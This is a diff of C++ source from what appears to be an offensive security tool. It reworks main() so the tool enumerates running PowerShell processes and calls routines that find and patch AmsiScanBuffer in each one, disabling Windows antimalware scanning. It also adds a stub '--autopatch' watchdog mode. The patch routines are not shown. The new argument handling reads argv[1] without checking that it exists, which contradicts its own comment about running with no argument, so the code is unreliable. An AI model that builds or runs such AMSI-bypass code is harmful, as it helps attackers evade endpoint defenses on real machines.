@@ -287,37 +287,53 @@ std::vector<DWORD> FindPowerShellProcesses() {
 }
 
 
-int main() {
-    //enum remote processes for powershell etc
-    auto powershellPIDs = FindPowerShellProcesses();
-
-    if (powershellPIDs.empty()) {
-        std::cout << "No PowerShell processes found." << std::endl;
+int main(int argc, char* argv[]) {
+    
+    //if autopatch, start watchdog class.
+    std::string arg1 = argv[1];
+    if (arg1 == "--autopatch") {
+        std::cout << "watchdog" << std::endl;
+        return 0;
     }
+
+    //if no arg (or some other arg), just go ahead and patch current instances
     else {
-        for (DWORD pid : powershellPIDs) {
-            std::cout << "[+] Found PowerShell PID: " << pid << std::endl;
+        //enum remote processes for powershell etc
+        auto powershellPIDs = FindPowerShellProcesses();
+
+        if (powershellPIDs.empty()) {
+            std::cout << "No PowerShell processes found." << std::endl;
         }
+        else {
+            for (DWORD pid : powershellPIDs) {
+                std::cout << "[+] Found PowerShell PID: " << pid << std::endl;
+            }
+        }
+
+        std::cout << "[+] ===== Starting Patching =====" << std::endl;
+
+        for (auto pid : powershellPIDs) {
+            std::cout << "[+] ===== Attempting to Patch PID " << pid << " =====" << std::endl;
+
+            //patch stuff here
+            RemoteAmsiPatch rap(pid);
+            rap.info();
+            rap.openremoteProcessHandle();
+            rap.getAmsiAddress();
+            rap.getAmsiScanBufferAddress();
+            rap.patchAmsi();
+        }
+
+        return 0;
     }
 
-    std::cout << "[+] ===== Starting Patching =====" << std::endl;
-
-    for (auto pid : powershellPIDs) {
-        std::cout << "[+] ===== Attempting to Patch PID " << pid << " =====" << std::endl;
-
-        //patch stuff here
-        RemoteAmsiPatch rap(pid);
-        rap.info();
-        rap.openremoteProcessHandle();
-        rap.getAmsiAddress();
-        rap.getAmsiScanBufferAddress();
-        rap.patchAmsi();
-    }
-
-    return 0;
 }
 
 /*
+* 
+* TODO:
+* [ ] Watchdog Class
+* 
 watchdog idea:
 
  arg: --autopatch
